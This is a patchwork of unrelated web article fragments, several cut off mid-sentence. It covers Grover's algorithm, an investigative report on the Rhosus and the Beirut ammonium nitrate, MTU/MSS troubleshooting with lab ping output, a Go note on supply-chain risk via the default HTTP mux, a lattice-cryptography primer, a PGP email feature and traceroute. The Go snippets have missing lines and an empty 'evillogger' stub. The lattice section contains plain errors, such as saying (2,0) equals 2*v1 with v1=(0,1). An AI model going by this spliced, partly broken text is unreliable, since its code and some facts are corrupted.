</p><p>This means that for the top output qubits, although we have equal probability to observe each of the base qubit states, the phase amplitude of the base qubit $|\mathbf{x}^\ast \rangle$ is different from all the others! That is also to say, the phase of the top input qubits is 
$\big[ \frac{1}{\sqrt{2^n}}, \frac{1}{\sqrt{2^n}}, \cdots, \frac{1}{\sqrt{2^n}} \big]$, but the phase of the output qubits becomes $\big[ \frac{1}{\sqrt{2^n}}, \cdots, \frac{1}{\sqrt{2^n}}, -\frac{1}{\sqrt{2^n}}, \frac{1}{\sqrt{2^n}},\cdots, \frac{1}{\sqrt{2^n}} \big]$.</p>

<h4 id="phase-diffusion-circuit">Phase Diffusion Circuit</h4>

<p>Now, in order to find $| \mathbf{x}^\ast \rangle$, the strategy becomes straightforward. We just have to find out the base qubits state whose phase amplitude is different from others. The question is, how to find it?</p>



<p>Let’s do some dummy trials. If we send the top output qubits to another identical quantum oracle circuit, the phase will go back to $\big[ \frac{1}{\sqrt{2^n}}, \frac{1}{\sqrt{2^n}}, \cdots, \frac{1}{\sqrt{2^n}} \big]$. The readers could verify this on you own. This means we have gone back to the origin. We should probably do something differently.</p>



<p>What Grover found was actually very smart. The average of the phase amplitudes $\big[ \frac{1}{\sqrt{2^n}}, \cdots, \frac{1}{\sqrt{2^n}}, -\frac{1}{\sqrt{2^n}}, \frac{1}{\sqrt{2^n}},\cdots, \frac{1}{\sqrt{2^n}} \big]$ is a value only a little bit smaller than $\frac{1}{\sqrt{2^n}}$, because the majority of the phase amplitudes are $\frac{1}{\sqrt{2^n}}$, and only one phase amplitude corresponding to $|\mathbf{x}^\ast \rangle$, which we denote as $\alpha_{\mathbf{x}^{\ast}}$, is $-\frac{1}{\sqrt{2^n}}$. If we could <em>inverse the phase amplitude about the mean</em>, the absolute value of $\alpha_{\mathbf{x}^{\ast}}$ will become the largest among all the phase amplitudes.</p>



<p>Specifically, at time step $t$, suppose the phase amplitude for each base qubits state $|\mathbf{x} \rangle$ is $\alpha_{\mathbf{x}, t}$. The average of the phase amplitudes $\mu_t$ is</p><p>

\[\mu_t = \frac{1}{2^n} \sum_{\mathbf{x} \in \{0,1\}^n}^{} \alpha_{\mathbf{x}, t}\]

</p><p>After the <em>inversion about the mean</em>, the phase amplitudes would become</p><p>

\[\begin{align}
\alpha_{\mathbf{x}, t}^{\prime} &amp;= (\mu_t - \alpha_{\mathbf{x}, t}) + \mu_t \\
&amp;= 2\mu_t - \alpha_{\mathbf{x}, t} \\
\end{align}\]

</p><p>To do this in a matrix …</p></div></div>

<p>In September 2013, eight Ukrainians and a Russian departed Georgia on a beat-up freighter, apparently heading for Mozambique. Their ship was already in bad shape before it even left the Black Sea port of Batumi. Called the <em>Rhosus, </em>the vessel was leaking, its alarm system was faulty and so was its rescue equipment.</p>


<div>
<p>But the cargo on board was extremely volatile: 2,750 tons of ammonium nitrate in a highly concentrated variant, the kind used to make explosives, with a nitrogen enrichment level of almost 35 percent. Seven years later, on August 4, 2020, it would devastate parts of Lebanon's capital city Beirut, killing around 200 people and injuring thousands.</p><p>Since then, the world has taken an interest in the <em>Rhosus</em> and its history, with investigators trying to piece together the details of its final voyage. How did the <em>Rhosus</em> end up in Beirut? And who had really ordered the explosive chemicals?</p><p>Thus far, the story has been that the ship belonged to a Russian man named Igor Grechushkin. The cargo was reportedly destined for a company called Fábrica de Explosivos de Moçambique, or FEM for short, a Mozambican explosives manufacturer.</p>
</div>

<p>But joint reporting conducted by DER SPIEGEL and the journalism network called the Organized Crime and Corruption Reporting Project (OCCRP) has now raised doubts about that narrative. The reporting has found that it was not Russian national Grechushkin who owned the <em>Rhosus</em>, but rather the Cypriot businessman Charalambos Manoli, who maintained a relationship with the bank used by Hezbollah in Lebanon. And a considerable amount of the ammonium nitrate stored in the port of Beirut appears to have gone missing before the explosion in August.</p>

<p>Did the crew of the <em>Rhosus </em>ever even intend to sail the ship to Mozambique? Is it possible that its explosive cargo was actually destined for Hezbollah, the Islamist party and militia that operates in Lebanon as a state within a state and is involved in wars from Syria to Iraq?</p>

<div>
<h3>Efforts to Conceal Ownership</h3><p>In any case, Manoli made every effort to conceal the ownership of the <em>Rhosus</em>. One of his companies arranged to have the <em>Rhosus </em>registered in Moldova. Another company, Maritime Lloyd in Georgia, certified the seaworthiness of the ailing freighter. Ultimately, Russian national Grechushkin only chartered the ship through his company Teto Shipping, which is registered in the Marshall Islands.</p><p>When questioned by OCCRP, Manoli initially claimed that the vessel had been sold to Grechushkin, only to then concede that the Russian had only made an attempt to buy the ship. He then refused to provide any further information.</p>
</div>

<div>
<p>Grechushkin did, in fact, give the orders to the crew on the <em>Rhosus.</em> He also gave the order that the <em>Rhosus</em> was to make an unscheduled stop in Beirut on its way from Georgia to Mozambique. The official reason sounds dubious: Grechushkin claimed that he didn’t have enough money to pay for the <em>Rhosus</em>’ passage through the Suez Canal. Which is why it needed to pick up additional cargo in Beirut to be delivered to Jordan. The freight consisted of "12 large trucks, 15 small ones, one 40-foot container and two 20-foot containers," states a report by the Lebanese Transportation Ministry.</p><p>The fleet of vehicles was to be stowed on the deck of the <em>Rhosus.</em> But the problems began during the loading of the very first vehicle, which rammed a door as they tried to maneuver it onto the deck. The loading procedure was aborted as a consequence.</p><p>Ultimately, the <em>Rhosus</em> never left Beirut. At least two companies that Manoli owed money to had the freighter seized, including one that rented generators, from which Manoli had previously rented a generator for the ship. The Beirut Port Authority also found that the <em>Rhosus</em> was not&nbsp;seaworthy.</p>

<p>The Lebanese authorities apparently didn’t know that Manoli was the true owner of the <em>Rhosus.</em> In any case, his name doesn’t appear in any of the correspondence, which was voluminous.</p><p>In contrast to Grechushkin, the Russian who chartered the vessel, Manoli did have business relations in Lebanon. Court records show that Manoli took out a loan back in 2011 for $4 million from the Tanzanian FBME Bank to finance the purchase of another ship, the <em>Sakhalin</em>.</p><p>FBME isn’t just any bank. American investigators have accused the institution of acting as a money launderer for Hezbollah. Another of the bank’s customers was a suspected Syrian front company that had been involved in the country’s chemical weapons program. It was to this bank that Manoli owed money.</p><h3>Seized Holdings</h3><p>Only one month after he received the loan, Manoli’s company Seaforce Marine Limited, based in Belize in Central America, defaulted on the first installment. Manoli had offered the <em>Rhosus</em> as collateral, but FBME suspected that the shipowner wanted to sell the vessel and seized Manoli’s real estate holdings in Cyprus.</p><p>Internal FBME documents show that Manoli still owed the bank 962,000 euros in outstanding debt in October 2014. Manoli denies any connection between his debts and the fact that the freighter was stopped in Beirut. However, one investigator notes that FBME is notorious for pressuring defaulting borrowers into doing favors for dubious customers like Hezbollah.</p><p>A spokesperson for FBME Ltd commented: "Neither FBME, the Saab family, their associates, nor the Federal Bank of Lebanon had any involvement with the MV Rhosus. FBME Bank did provide, in around 2012, a loan to SeaForce Marine Ltd, owned by Mr. Charalambos Manoli, for the purchase of the MV Sakhalin. This loan was accordingly secured against the MV Sakhalin, which has since been scrapped. Neither Mr Manoli nor SeaForce Marine Ltd made any repayments towards the loan, and the Bank initiated legal proceedings against them. Since the Administrators took over the Bank in July 2014, we are unaware of the current status of the case. The MV Rhosus was never collateral for the loan and FBME Bank never had any involvement either with its financing or ownership.&nbsp;We believe these allegations are commercially motivated and confirm that we have no relationship with Hezbollah."</p><p>The official buyer of the ammonium nitrate, FEM in Mozambique, was also a subject of investigations. Spanish authorities conducted an investigation into the company Moura Silva e Filhos, which holds 95-percent ownership of FEM, in connection with the Islamist terrorist attacks in Madrid in 2004. Even though they didn’t ultimately obtain a conviction for aiding terrorists, investigators determined that 785 kilograms of explosives were not listed in the company’s books.</p>

<p>Moura Silva e Filhos clearly isn’t squeamish when it comes to choosing his business partners. American arms smuggling expert Kathi Lynn Austin says the company maintains close contacts with the ruling clique in Mozambique, among others.</p><p>However, FEM never claimed the 2,750 tons of ammonium nitrate that was stranded in Beirut on the <em>Rhosus</em>, even though the chemicals were at no point officially confiscated by the Lebanese authorities.</p><p>In 2015, the broker for the ammonium nitrate had a lawyer request that the Lebanese authorities inspect the quality and quantity of the cargo. Oddly, though, the court records do not show any attempt by the broker to recover the cargo, which had an original value of $700,000.</p><p>Manoli likewise didn’t make any efforts to reclaim his ship, which eventually sank outside the port in February 2018. Purported <em>Rhosus</em> owner Grechushkin could not be reached for comment.</p><h3>Abandoned</h3><p>Ultimately, the ammonium nitrate was an abandoned freight: No one admitted to having paid for it and no one tried to recover it.</p><p>In the end, the highly explosive chemicals were stored for six years in Hall 12 at the Port of Beirut. The authorities, particularly customs officials, warned repeatedly that the ammonium nitrate needed to be removed from the port. But the petitions were sent to the wrong court so persistently that it is difficult for lawyers involved to believe in mere incompetence. Is it possible that the intent was for the ammonium nitrate to remain in Hall 12?</p><p>Another inspection of the cargo in spring 2020, this time by the Lebanese state security, raised doubts as to whether all 2,750 tons of the ammonium nitrate were still there. One of the warehouse’s gates was missing and there was a large hole in the south wall, they warned. "If a theft were to occur, the perpetrators could use these goods as explosives." But the state security officials apparently didn’t count or measure the exact amount of ammonium nitrate that was still left in the warehouse at the time.</p><p>Their warning that the warehouse needed to be secured didn’t reach Lebanon’s prosecutor general until June. In mid-July, state security also sent the report to the president and the prime minister. But no action was taken.</p><p>It’s still unclear today how much ammonium nitrate was detonated in the August 4 explosion. European intelligence officials involved in the investigation assume it was between 700 and 1,000 tons.</p><p>But where did the rest, the much larger quantity of the explosive chemicals, go?

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    <p>MTU and MSS are two terms that are easily mistaken and their misconfiguration is often the cause of networking problems. Spending enough time working on production systems that interface with large networks of computers or the Internet almost guarantees coming across situations where an interface was configured with the wrong MTU, or a firewall was filtering ICMP. This results in a client being unable to transfer large amounts of data when smaller transfers work fine. This post will walk through MTU, MSS and packet size negotiation for TCP connections, and the common situations where it breaks down. This post was inspired by multiple discussions during the course of investigating errors on production systems as part of my role at GitHub.</p>

<p>If you want to take away a simple snippet from this post, the summary is:</p>

<p>
The MTU of the interfaces on either side of a physical<br>
or logical link must be equal. Don't block ICMP.
</p>

<p>The examples mentioned in this blog post will be reproducible in the lab from <i></i> <a href="https://github.com/theojulienne/blog-lab-mtu">theojulienne/blog-lab-mtu</a> - clone this repository and <a href="https://www.vagrantup.com/">bring up the lab</a>, then poke around at these examples in a real system:</p>
<div><div><pre><code>$ git clone https://github.com/theojulienne/blog-lab-mtu.git
$ cd blog-lab-mtu
$ vagrant up
$ vagrant ssh
</code></pre></div></div>

<h2 id="ethernet-mtu-maximum-transmission-unit">Ethernet MTU: Maximum Transmission Unit</h2>

<p>The MTU (Maximum Transmission Unit) on an Ethernet network specifies the maximum payload size of the data to be transmitted along with an Ethernet header on a network. Typically this payload will be an IP packet, in which case the MTU specifies the maximum combined size of the IP header and IP data.</p>

<p><img alt="Ethernet / IP / TCP headers with MTU indicated" src="https://theojulienne.io/images/mtu-mss-why-connections-stall/mtu-packet.png">
</p>

<p>The MTU is specified at the interface level as it is a link-level setting, and is typically propagated down to the underlying network card driver. The expectation is that packets that are larger than this configured size that appear to be transmitted over the wire are invalid or corrupt and should be dropped. In a valid configuration, hosts connected together via a link will have the same MTU specified:</p>

<p><img alt="Client and server connected with matching MTU" src="https://theojulienne.io/images/mtu-mss-why-connections-stall/simple-2-computers-match.png">
</p>

<p>If interfaces on either side of a link have mismatching MTU configurations, then the smaller side will treat packets larger than the local MTU as invalid and drop the packets before any software has the chance to see them.</p>

<p><img alt="Client and server connected with mismatching MTU" src="https://theojulienne.io/images/mtu-mss-why-connections-stall/simple-2-computers-mismatch.png">
</p>

<p>Streams of data that are larger than the MTU will be broken up into packets that completely fill an Ethernet frame, up to the MTU in each. If the remote end has a smaller MTU configured for the same link, those larger packets will be dropped. MTU should be configured the same on both interfaces on either side of a link, and so the MTU should be considered a bidirectional maximum.</p>

<h3 id="mtu-in-the-lab">MTU in the lab</h3>

<p>The lab in this blog post can be used to observe this in an example system. In one terminal, bring up the lab hosts inside the Vagrant machine:</p>
<div><div><pre><code>$ vagrant ssh -- /vagrant/bin/run-lab
</code></pre></div></div>

<p>In another terminal, <code>vagrant ssh</code> then enable the first scenario from above with matching MTU of 1500 on client and server:</p>
<div><div><pre><code>vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/scenario direct_1500
</code></pre></div></div>

<p>Log in to the client and server hosts and observe that we can send a packet with 1400 bytes of payload as expected, since both hosts have an MTU of 1500. The <code>-s 1400</code> argument to <code>ping</code> sets the payload size, and the <code>-M do</code> argument instructs <code>ping</code> to set the <code>DF</code> (Don’t Fragment) bit, ensuring that the whole IP packet must arrive in one piece or not at all.</p>
<div><div><pre><code>vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/shell client
root@client:/# ping -c 2 -M do -s 1400 server-direct
PING server-direct (172.28.0.40) 1400(1428) bytes of data.
1408 bytes from server-direct (172.28.0.40): icmp_seq=1 ttl=64 time=0.096 ms
1408 bytes from server-direct (172.28.0.40): icmp_seq=2 ttl=64 time=0.080 ms

--- server-direct ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 2ms
rtt min/avg/max/mdev = 0.080/0.088/0.096/0.008 ms
root@client:/# exit
vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/shell server
root@server:/# ping -c 2 -M do -s 1400 client-direct
PING client-direct (172.28.0.10) 1400(1428) bytes of data.
1408 bytes from client-direct (172.28.0.10): icmp_seq=1 ttl=64 time=0.079 ms
1408 bytes from client-direct (172.28.0.10): icmp_seq=2 ttl=64 time=0.071 ms

--- client-direct ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 32ms
rtt min/avg/max/mdev = 0.071/0.075/0.079/0.004 ms
root@server:/# 
</code></pre></div></div>

<p>Now switch to the second scenario with mismatching MTU, and observe that 1400 byte payloads no longer succeed:</p>
<div><div><pre><code>vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/scenario direct_mismatch

vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/shell client
root@client:/# ping -c 2 -M do -s 1400 server-direct
PING server-direct (172.28.0.40) 1400(1428) bytes of data.
ping: local error: Message too long, mtu=1200
ping: local error: Message too long, mtu=1200

--- server-direct ping statistics ---
2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 10ms

root@client:/# exit
vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/shell server
root@server:/# ping -c 2 -M do -s 1400 client-direct
PING client-direct (172.28.0.10) 1400(1428) bytes of data.

--- client-direct ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 19ms

root@server:/# 
</code></pre></div></div>

<p>Notice that the <code>client</code> host is immediately able to observe that it cannot send a packet this large since the MTU on the interface is 1200. However, the <code>server</code> host believes the MTU of the link is 1500, so sends the packet, however the <code>client</code> is unable to receive it. This occurs at such a low level that neither host is aware of the failure - the packet just disappears.</p>

<h2 id="tcp-mss-maximum-segment-size">TCP MSS: Maximum Segment Size</h2>

<p>The TCP MSS (Maximum Segment Size) sounds very similar to MTU, and since it relates to the maximum size of network packets, they are easy to conflate even though they are quite different. A TCP segment is the TCP header and TCP data that forms part of a single packet. The MSS specifies the expected maximum size of the data component of this segment that a host expects it would be able to receive without the IP packet being <a href="https://en.wikipedia.org/wiki/IP_fragmentation">fragmented</a>. IP fragmentation is typically disabled for TCP packets on modern networking stacks due to the added complexity and overhead, so the MSS represents the maximum size that the host expects to be able to receive in any given packet.</p>

<p><img alt="Ethernet / IP / TCP headers with MTU and MSS indicated" src="https://theojulienne.io/images/mtu-mss-why-connections-stall/mtu-mss-packet.png">
</p>

<p>Rather than being an interface-level configuration like MTU, the MSS advertisement forms a part of the typical TCP handshake and is calculated based on the underlying MTU of the interface that a local host will use to communicate with a remote host. MSS can be thought of as a TCP hint around how much data can be included in a single TCP packet, given the current MTU. Each host calculates the MSS it will advertise by taking the local MTU and subtracting the size of the IP and TCP headers, then includes that MSS in the TCP options of the SYN or SYN-ACK packet as part of the <a href="https://en.wikipedia.org/wiki/TCP_handshake">TCP three-way handshake</a>.</p>

<p>This is not a negotiation of a single MSS, but rather each host is giving the remote host an indication of the maximum size of a single packet it expects will be possible to send back. This number must be less than the MTU minus IP/TCP headers, since there’s no way any larger packet could arrive given the local MTU. Each host will use the remote host’s advertised MSS as a hint for what size individual outgoing packets should be. Since this is a configurable hint, it is also only unidirectional, and although a host may advertise a lower MSS than it can otherwise handle, that doesn’t in any way restrict it from sending packets larger than the MSS it advertised (providing the remote host allowed for it).</p>

<p>The simple MSS exchange happens to work around small misconfigurations of MTU, such as the trivial example described above:</p>

<p><img alt="Client and server connected with mismatching MTU" src="https://theojulienne.io/images/mtu-mss-why-connections-stall/simple-2-computers-mismatch.png">
</p>

<p>In this case, the client would advertise an MSS of <code>1200 (MTU) - 20 (IP hdr) - 20 (TCP hdr) = 1160</code>, which would cause the server to refrain from sending packets that contained more than 1160 bytes in the TCP payload, which also ensures it would be able to arrive within the bounds of the MTU of 1200 once those headers are added on.</p>

<p>However, the above network is still misconfigured, since even though TCP happens to work around it, other protocols will fail since they don’t exchange MSS values. MSS is actually intended to allow hosts to work around valid configurations where their own local networks have different MTU, such as the following:</p>

<p><img alt="Client and server connected with different MTUs, but valid configuration" src="https://theojulienne.io/images/mtu-mss-why-connections-stall/router-different-mtu.png">
</p>

<p>In this example, if the server with a valid MTU of 9000 attempted to send an Ethernet frame containing more than 1500 bytes without fragmentation being allowed, that packet would not be able to make it to the client. The intermediary router, being the first host that is aware of this problem as it is aware of the MTU of both links, would send an ICMPv4 “Fragmentation required, but DF set” message or an ICMPv6 “Packet Too Big” message back to the sender to inform it that forwarding the packet without breaking it up is not possible (and that the IP header had the DF, or Don’t Fragment, bit set).</p>

<p>However, TCP will succeed in unrestricted communications between these hosts due to the MSS advertisements. The server in this configuration will receive an MSS from the client that will ensure no Ethernet frames with a payload larger than 1500 bytes are generated, so they will be received successfully.</p>

<h3 id="mss-in-the-lab">MSS in the lab</h3>

<p>Select the scenario from above with the client on a network with 1500 MTU and the server on a network with 9000 MTU:</p>
<div><div><pre><code>vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/scenario client_net_smaller
</code></pre></div></div>

<p>Running a ping from the side with the larger MTU, we can observe that packets larger than the client’s MTU cause the intermediary router to return an ICMP message since it is unable to forward the packet:</p>
<div><div><pre><code>vagrant@blog-lab-mtu:/vagrant$ /vagrant/bin/shell server
root@server:/# ping -c 2 -M do -s 3000 client
PING client (172.29.0.10) 3000(3028) bytes of data.
From 172.30.0.20 icmp_seq=1 Frag needed and DF set (mtu = 1500)
ping: local error: Message too long, mtu=1500

--- client ping …</code></pre></div></div></article></div>

  <p><span>21 Aug 2020</span></p><p>I saw many guides and post showing a handy and simple way to create a webserver in go like this:</p>

<div><div><pre><code><span>package</span> <span>main</span>

    <span>"fmt"</span>

        <span>fmt</span><span>.</span><span>Fprintf</span><span>(</span><span>w</span><span>,</span> <span>"pong"</span><span>)</span>
    <span>})</span>


    <span>fmt</span><span>.</span><span>Printf</span><span>(</span><span>"Starting server at port 8080</span><span>\n</span><span>"</span><span>)</span>
    <span>if</span> <span>err</span> <span>:=</span> <span>http</span><span>.</span><span>ListenAndServe</span><span>(</span><span>":8080"</span><span>,</span> <span>nil</span><span>);</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
        <span>log</span><span>.</span><span>Fatal</span><span>(</span><span>err</span><span>)</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>Internally http.HandleFunc and http.Handle register the handler/handler function in the DefaultServerMux. The problem is that DefaultServerMux is a global and exported var.</p>

<p>An attacker might develop a malicious lib or hijack an existing one and attach a handler to the DefaultHandlerMux, for example in the init.</p>

<div><div><pre><code><span>package</span> <span>evillogger</span>

<span>func</span> <span>init</span><span>(){</span>

<span>}</span>
</code></pre></div></div>

<p>Its not hard to hide or obfuscate code in large projects or codebases but
the way to mitigate this problem is quite simple, just create a new server mux:</p>

<div><div><pre><code><span>serverMux</span> <span>:=</span> <span>http</span><span>.</span><span>NewServeMux</span><span>()</span>
</code></pre></div></div>

<p>In my opinion the biggest and most important lesson is not to add untrusted third-party libraries without a minimum verification.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>Lattice-based cryptography has been coming into the spotlight recently. In January 2019, Many of the semifinalists in the <a href="https://www.nist.gov/news-events/news/2019/01/nist-reveals-26-algorithms-advancing-post-quantum-crypto-semifinals" rel="noopener">NIST post-quantum-cryptography competition</a> were based on lattices. Lattice based cryptography has promising aspects that make it a contender for the basis of cryptographic security in a post-quantum world.</p>



<h2>What is a Lattice?</h2>



<p> According to <a href="https://en.wikipedia.org/wiki/Lattice-based_cryptography" rel="noopener">Wikipedia</a>, a lattice&nbsp;is the set of all integer linear combinations of basis vectors:</p>



<div><div>
<div><figure><img loading="lazy" src="https://wikimedia.org/api/rest_v1/media/math/render/svg/66095403ff779502911d684cccf77daff8981b56" alt="{\displaystyle \mathbf {b} _{1},\ldots ,\mathbf {b} _{n}\in \mathbb {R} ^{n}}" width="128" height="21" title="66095403ff779502911d684cccf77daff8981b56"></figure></div>
</div></div>



<p>i.e.</p>



<div><div>
<div><figure><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/bfe3dc9615c168ff919b1c5b229ad392229b8c1d" alt="{\displaystyle L={\Big \{}\sum a_{i}\mathbf {b} _{i}\ :\ a_{i}\in \mathbb {Z} {\Big \}}\;.}" title="bfe3dc9615c168ff919b1c5b229ad392229b8c1d"></figure></div>
</div></div>



<p>More simply put, a lattice is defined by basis vectors, which are only able to be scaled by integers… yay no fractions! </p>



<p>For example, let’s create a lattice of all the integers in a two-dimensional plane:</p>



<figure><img loading="lazy" width="1024" height="740" src="https://qvault.io/wp-content/uploads/2020/01/Capture-1024x740.png" alt="two dimensional lattice" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture-1024x740.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture-300x217.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture-768x555.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture-100x72.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture-862x623.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture-1200x867.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture"></figure>



<p>The definition of our lattice contains only 2 basis vectors,</p>



<p>v1 = (0,1) </p>



<p>v2 = (1,0)</p>

<p>Our lattice is the set of <strong>all </strong>values that can be reached by any combination and scale of our basis vectors. For example, the point (2,0) is in our lattice because it can be reached by 2*v1</p>



<figure><img loading="lazy" width="1024" height="740" src="https://qvault.io/wp-content/uploads/2020/01/Capture3-1-1024x740.png" alt="lattice with combination of vectors" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture3-1-1024x740.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-300x217.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-768x555.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-100x72.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-862x623.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1-1200x867.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture3-1.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture3 1"></figure>



<p>Similarly, we could create an entirely new lattice by changing our basis vectors to</p>



<p>v1 = (0,3)</p>



<p>v2 = (3,0)</p>



<figure><img loading="lazy" width="1024" height="583" src="https://qvault.io/wp-content/uploads/2020/01/Capture5-1-1024x583.png" alt="lattice with change of basic vectors" srcset="https://qvault.io/wp-content/uploads/2020/01/Capture5-1-1024x583.png 1024w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-300x171.png 300w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-768x437.png 768w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-100x57.png 100w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-862x491.png 862w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1-1200x683.png 1200w, https://qvault.io/wp-content/uploads/2020/01/Capture5-1.png 1315w" sizes="(max-width: 1024px) 100vw, 1024px" title="Capture5 1"></figure>



<p>As you can see, now the intermediary points (0,1) and (0,1) <strong>no longer exist</strong> in our lattice. There is no way to scale v1 (0,3) and v2 (3,0) to reach those points without using fractional scalars. With lattices, we can only scale by whole integers.</p>



<h2>How Does This Help With Crypto?</h2>



<p>Cryptographic algorithms are typically based on mathematical problems that are easy to verify the answer of, but hard to calculate.</p>



<p>For example, RSA is based on prime factorization. If I told you to find prime factors of <em>27,919,645,564,169,759</em>, that would be hard. However, if I told you that 48,554,491 and 575,016,749 <em>are </em>prime factors, all you have to do is multiply them together in order to verify my answer.</p>



<p>RSA works great with classical computers. There are <a href="https://crypto.stackexchange.com/questions/10590/what-makes-rsa-secure-by-using-prime-numbers" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">no known solutions to find prime factors</a> of a number reliably in less than exponential time.</p>



<p>In the quantum world, things don’t look so peachy. <a href="https://en.wikipedia.org/wiki/Shor%27s_algorithm" target="_blank" aria-label="Shor's algorithm (opens in a new tab)" rel="noreferrer noopener nofollow">Shor’s algorithm</a> on quantum computers can crack RSA in less than exponential time. For this reason, we need quantum-safe algorithms. Many believe that lattice math could be an answer.</p>



<h2>Shortest Vector Problem</h2>



<div><figure><img loading="lazy" width="220" height="112" src="https://qvault.io/wp-content/uploads/2020/01/220px-SVP.svg_.png" alt="shortest vector problem" srcset="https://qvault.io/wp-content/uploads/2020/01/220px-SVP.svg_.png 220w, https://qvault.io/wp-content/uploads/2020/01/220px-SVP.svg_-100x51.png 100w" sizes="(max-width: 220px) 100vw, 220px" title="220px SVP.svg"></figure></div>



<p><a aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Lattice_problem#Shortest_vector_problem_(SVP)" target="_blank">The shortest vector problem (SVP)</a> is one of the fundamentals problems presented by lattices that allow them to be useful in cryptography.</p>



<p>Simply put, the goal of SVP is for the attacker to find the shortest vector from the origin (above in red) when given the basis of a lattice (above in blue). A zero vector doesn’t work as an answer, we consider it trivial.</p>



<p>How is it solved?</p>



<p>Like RSA with classical computers, it is hard to find the shortest vector of a large lattice, especially if it exists in many dimensions. One such slow solution for approximating the shortest vector is <a href="https://en.wikipedia.org/wiki/L%C3%A1szl%C3%B3_Babai" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">Babai</a>‘s algorithm, or <a href="https://cims.nyu.edu/~regev/teaching/lattices_fall_2004/ln/cvp.pdf" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener nofollow">Nearest Plane Algorithm</a>, which you can read about in the links provided.</p>

        <p>Pretty Good Privacy (PGP) is a program to encrypt your emails, texts, files, etc. As emails on Gmail, Yahoo, Outlook and other popular email services are stored in <strong>cleartext</strong>, PGP can be a solution to keep your emails from being read &amp; analyzed by these big techs.</p>

<p>PGP is based on <a href="https://en.wikipedia.org/wiki/Public-key_cryptography">public-key cryptography</a>. Essentially you have 2 keys: a public key and a private key. Your public key is <strong>known</strong> to everyone whereas <strong>only</strong> you have access to the private key. A message encrypted with the public key can only be decrypted with the private key. You can learn more about PGP on <a href="https://www.openpgp.org/">openpgp</a>.</p>

<blockquote>
<p>In practice, if someone wants to send you a secret message that only you can read, this person encrypts the message using your public key.</p>
</blockquote>

<p>Without PGP, the emails sent to an alias are forwarded by SimpleLogin <strong>as-is</strong> to your mailbox, leaving anyone in-between or your email service being able to read your emails.</p>



<p><img src="https://simplelogin.io/blog/without-pgp.png"></p><hr>

<p>With PGP enabled, all emails arrived at SimpleLogin are <strong>encrypted</strong> with your public key before being forwarded to your mailbox.</p>

<p>As emails are not stored on SimpleLogin, only you can read your emails.</p>



<p><img src="https://simplelogin.io/blog/with-pgp.png"></p><blockquote>
<p>If you upload your PGP public key on SimpleLogin, <strong>only you</strong> can now read the emails sent to your aliases.</p>
</blockquote>

<p>You can create and manage your keys when adding/editing your mailboxes. Check it out your <a href="https://app.simplelogin.io/dashboard/mailbox">mailbox dashboard â†—</a>.</p>

<p>As PGP encryption is resource-intensive, this feature is only available in the Premium plan or during the trial period.</p>

<p>After the trial, SimpleLogin stops encrypting the forwarded emails.</p>

<h3 id="what-is-traceroute">What is traceroute?</h3>
<p>If you’ve fiddled with networks you must be familiar with the famous <code>traceroute</code> tool. Its a script that traces the path to a host and prints info on every hop it encounters. To give an example if you run <code>traceroute kalbhor.xyz</code> you should see something like this :</p>
<pre><code>❯ traceroute kalbhor.xyz

</code></pre><p>These might differ for you but for me this is the route my computer takes to connect to <code>kalbhor.xyz</code>. A few interesting details here include <code>dlinkrouter.dlink (192.168.0.1)</code>. Yes, that looks similar! It is my routers local IP, which means my router at home is the first machine to process my request. That’s pretty obvious.</p>
<p>Next we see <code>broadband.actcorp.in (49.207.47.201)</code> which is my ISP. We can also see that my request forwards to a ISP router in Delhi (most probably a regional level ISP) and further moves through Chennai and Singapore (kalbhor.xyz is hosted on an AWS Singapore server).</p>
<p>This tool is very useful to inspect network paths and solve problems. But aside from that, this tool is extremely interesting and its actual implementation is pretty simple.</p>
<hr>
<h3 id="how-does-traceroute-work">How does traceroute work?</h3>
<p>Now that we understand what traceroute does, lets take a look under the hood. Every TCP/UDP packet that travels has a bunch of headers containing info about the packet. One such header is the <code>ttl</code> header which is the number of hops the packet travels before being dropped. So if we set this <code>ttl</code> header to 1 our packet will reach the first hop and be dropped, if we set it to 2 our packet will reach the second hop and drop, and so on.</p>
<p>Now that we know how our packets can reach any of the hops between us and our destination, how do we collect info on the hop?
